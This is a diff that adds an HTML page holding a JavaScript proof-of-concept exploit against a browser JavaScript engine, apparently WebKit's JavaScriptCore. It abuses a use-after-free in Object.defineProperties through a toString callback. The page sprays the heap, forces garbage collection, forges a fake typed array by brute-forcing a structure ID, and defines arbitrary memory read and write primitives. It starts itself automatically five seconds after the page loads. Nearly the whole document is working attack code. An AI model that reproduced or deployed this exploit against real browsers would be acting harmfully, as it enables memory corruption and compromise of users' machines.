@@ -1,0 +1,312 @@
+<!doctype html>
+<html>
+    <head>
+        <link href="https://fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet">
+        <style>
+            body {
+                font-family: 'Inconsolata', monospace;
+            }
+
+            #status, #debug {
+                border: 1px solid #000;
+                margin: 5px;
+                padding: 5px;
+            }
+        </style>
+    </head>
+    <body>
+        <a href='javascript:go()'>PoC go!</a><br><br><a href='javascript:document.location.reload();'>refresh...</a><br>
+        <h3><a href="javascript:status('test')">Status:</a></h3>
+        <div id='status'> </div>
+        <h3>Debug:</h3>
+        <div id='debug'> </div>
+
+
+        <script>
+
+        function redraw() {
+            document.body.style.display = 'none';
+            document.body.style.display = 'block'
+        }
+
+        function status(msg) {
+            m = document.createElement('div');
+            m.innerText = msg;
+            document.getElementById('status').appendChild(m);
+            redraw()
+        }
+
+        function debug(msg) {
+            m = document.createElement('div');
+            m.innerText = msg;
+            document.getElementById('debug').appendChild(m);
+            redraw();
+        }
+
+        window.onerror = function(error, url, line) {
+            debug(error+' URL:'+url+' L:'+line);
+        };
+
+        </script>
+
+        <script>
+        
+
+        function smashed() {
+            status('smashed()');
+        }
+
+        var mem0 = 0;
+        var mem1 = 0;
+        var mem2 = 0;
+        var structID = 100;
+
+        function read4(addr) {
+            mem0[4] = addr;
+            var ret = mem2[0];
+            mem0[4] = mem1;
+            return ret;
+        }
+
+        function write4(addr, val) {
+            mem0[4] = addr;
+            mem2[0] = val;
+            mem0[4] = mem1;
+        }
+
+        _dview = null;
+        
+        function u2d(low, hi) {
+            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+            _dview.setUint32(0, hi);
+            _dview.setUint32(4, low);
+            return _dview.getFloat64(0);
+        }
+
+        // garbage collection stuff
+        var pressure = new Array(100);
+        dgc = function() {
+            for (var i = 0; i < pressure.length; i++) {
+                pressure[i] = new Uint32Array(0x10000);
+            }
+            for (var i = 0; i < pressure.length; i++) {
+                pressure[i] = 0;
+            }
+        }
+
+        for (var i = 0; i < 0x1000; i++) {
+            var a = new Uint32Array(1);
+            // Add a new property to create a new Structure instance.
+            a[i.toString(16)] = 1337;
+        }
+
+        function swag() {
+            // in case bufs contains data, don't do it
+            if (bufs[0]) return;
+            // really make sure garbage is collected
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            // for the whole buf
+            for (i = 0; i < bufs.length; i++) {
+                // fill it with a lot of arrays
+                bufs[i] = new Uint32Array(0x100 * 2)
+                // for each element of that array
+                for (k = 0; k < bufs[i].length;) {
+                    // set memory to 0x41414141 0xffff0000
+                    // probably creates fake objects. check what object is ffff0000
+                    // XXX: what happens with the last element.
+                    bufs[i][k++] = 0x41414141;
+                    bufs[i][k++] = 0xffff0000;
+                }
+            }
+        }
+
+        var bufs = new Array(100);
+        var trycatch = "";
+        // make sure this code is jitted
+        for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
+        var fc = new Function(trycatch);
+        var fcp = 0;
+        var smsh = new Uint32Array(0x10);
+        var stale = 0;
+
+        function go_() {
+            // check if the length of the array smash changed
+            if (smsh.length != 0x10) {
+                smashed();
+                return;
+            }
+            // garbage collect
+            dgc();
+            // new array with 0x100 elements
+            var arr = new Array(0x100);
+            // new array buffer of length 0x1000
+            var yolo = new ArrayBuffer(0x1000);
+            // populate the arr with pointer to yolo and a number
+            arr[0] = yolo;
+            arr[1] = 0x13371337;
+            // create an object whos toString function returns number 10 and messes with arr.
+            var not_number = {};
+            not_number.toString = function() {
+                arr = null;
+                props["stale"]["value"] = null;
+                //console.log('not_number_triggered')
+                // might do some heap spray? checking and writing to buf
+                // fill memory with 0x4141414141
+                swag();
+                return 10;
+            };
+            // define a new object with some properties
+            var props = {
+                p0: {
+                    value: 0
+                },
+                p1: {
+                    value: 1
+                },
+                p2: {
+                    value: 2
+                },
+                p3: {
+                    value: 3
+                },
+                p4: {
+                    value: 4
+                },
+                p5: {
+                    value: 5
+                },
+                p6: {
+                    value: 6
+                },
+                p7: {
+                    value: 7
+                },
+                p8: {
+                    value: 8
+                },
+                length: {
+                    value: not_number
+                },
+                stale: {
+                    value: arr
+                },
+                after: {
+                    value: 666
+                }
+            };
+            // define a new target array
+            var target = [];
+            // remember the old length of the arr array
+            var before_len = arr.length;
+            // set the properties of the target based on the previously defined ones
+            Object.defineProperties(target, props);
+            // get a reference to the target stale property, which points to arr
+            stale = target.stale;
+            stale[0] += 0x101;
+            for (i = 0; i < bufs.length; i++) {
+                for (k = 0; k < bufs[0].length; k++) {
+                    //debug('bufs['+i+']['+k+'] = '+bufs[i][k]);
+                    if (bufs[i][k] == 0x41414242) {
+                        alert('overlap');
+                        bufs.push(stale);
+                        stale[0] = fc;
+                        fcp = bufs[i][k];
+                        //debug('fcp = '+fcp.toString(16));
+                        structID = 100;
+                        stale[0] = {
+                            'a': u2d(structID, 0), // the JSObject properties
+                            'b': u2d(0, 0),
+                            'c': smsh, // var smsh = new Uint32Array(0x10)
+                            'd': u2d(0x100, 0)
+                        }
+                        stale[1] = stale[0];
+                        bufs[i][k] += 0x10;
+                        while(!(stale[0] instanceof Uint32Array)) {
+                            structID++;
+                            stale[1]['a'] = u2d(structID, 0);
+                            //alert(structID);
+                        }
+                        alert('found structID for Uint32Array = '+structID);
+                        alert('stale[0] is now: '+stale[0]);
+
+                        //debug('stale[0] is: '+stale[0]);
+                        //debug('stale[0].length: '+stale[0].length);
+                        //debug('smsh.length: '+smsh.length);
+
+                        //debug('bufs['+i+']['+(k+0)+'] = 0x'+bufs[i][k].toString(16));
+                        //debug('bufs['+i+']['+(k+2)+'] = 0x'+bufs[i][k+2].toString(16));
+
+                        //debug('[+] set stale[1]=stale[0]');
+                        
+
+                        //debug('bufs['+i+']['+(k+0)+'] = 0x'+bufs[i][k].toString(16));
+                        //debug('bufs['+i+']['+(k+2)+'] = 0x'+bufs[i][k+2].toString(16));
+
+                        //debug('[+] missalign += 0x10');
+                         // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+
+                        //debug('bufs['+i+']['+(k+0)+'] = 0x'+bufs[i][k].toString(16));
+                        //debug('bufs['+i+']['+(k+2)+'] = 0x'+bufs[i][k+2].toString(16));
+                        
+                        // should be a Uint32Array now
+                        
+                        //debug('stale[0].length: '+stale[0].length);
+                        //debug('smsh.length: '+smsh.length);
+                        
+                        //debug('[+] look at the stale array reference');
+                        //debug('stale[0] = '+stale[0]);
+                        /*for(j=0;j<16;j++) {
+                            debug('stale[0]['+j+'] = 0x'+stale[0][j]);
+                        }*/
+                        /*
+                        //remember the initial value of stale
+                        bck = stale[0][4];
+                        stale[0][4] = 0; // address, low 32 bits mem0[4]
+                        //stale[0][5] = 1; // address, high 32 bits == 0x100000000
+                        //stale[0][6] = 0xffffffff;
+                        
+                        bufs.push(stale)
+                        debug('[*] smsh.length = '+smsh.length.toString(16)+' should not be 0x10?')
+                        
+
+                        mem0[4] = addr; // stale[0][4]
+                        var ret = mem2[0];
+                        mem0[4] = mem1;
+
+                        debug('[*] smsh.length = '+smsh.length.toString(16)+' should not be 0x10?')
+
+                        debug('[*] mem2[0]/ret = 0x'+ret.toString(16));*/
+                        return;
+                    }
+                }
+            }
+            debug('done.');
+            setTimeout(function() {
+                document.location.reload();
+            }, 500);
+        }
+
+        function go() {
+            status('getting ready!');
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            dgc();
+            setTimeout(go_, 400);
+        }
+        setTimeout(go, 5000);
+        </script>
+    </body>
+</html>
